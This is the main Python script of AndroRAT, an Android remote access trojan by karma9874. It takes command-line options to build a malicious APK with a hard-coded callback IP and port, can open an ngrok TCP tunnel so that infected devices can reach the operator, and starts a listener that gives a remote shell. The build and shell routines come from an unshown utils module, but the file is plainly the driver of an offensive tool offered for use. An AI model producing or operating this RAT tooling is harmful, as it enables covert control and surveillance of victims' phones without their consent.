from utils import *
import argparse
from colorama import Fore, Style,init
from pyngrok import ngrok,conf
clearDirec()

#                     _           _____         _______
#     /\             | |         |  __ \     /\|__   __|
#    /  \   _ __   __| |_ __ ___ | |__) |   /  \  | |   
#   / /\ \ | '_ \ / _` | '__/ _ \|  _  /   / /\ \ | |   
#  / ____ \| | | | (_| | | | (_) | | \ \  / ____ \| |   
# /_/    \_\_| |_|\__,_|_|  \___/|_|  \_\/_/    \_\_|   
#                                        - By karma9874


parser = argparse.ArgumentParser(usage="%(prog)s [--build] [--shell] [-i <IP> -p <PORT> -o <apk name>]")
parser.add_argument('--build',help='For Building the apk',action='store_true')
parser.add_argument('--shell',help='For getting the Interpreter',action='store_true')
parser.add_argument('--ngrok',help='For using ngrok',action='store_true')
parser.add_argument('-i','--ip',metavar="<IP>" ,type=str,help='Enter the IP')
parser.add_argument('-p','--port',metavar="<Port>", type=str,help='Enter the Port')
parser.add_argument('-o','--output',metavar="<Apk Name>", type=str,help='Enter the apk Name')
args = parser.parse_args()


if args.build:
    port_ = args.port
    if args.ngrok:
        conf.get_default().monitor_thread = False
        port = 8000 if not port_ else port_
        tcp_tunnel = ngrok.connect(port, "tcp")
        ngrok_process = ngrok.get_ngrok_process()
        domain,port = tcp_tunnel.public_url[6:].split(":")
        ip = socket.gethostbyname(domain)
        print(stdOutput("info")+"\033[1mTunnel_IP: %s PORT: %s"%(ip,port))
        build(ip,port,args.output,True,port_)
    else:
        if args.ip and args.port:
            build(args.ip,port_,args.output,False,None)
        else:
            print(stdOutput("error")+"\033[1mArguments Missing")

if args.shell:
    if args.ip and args.port:
        get_shell(args.ip,args.port) 
    else:
        print(stdOutput("error")+"\033[1mArguments Missing")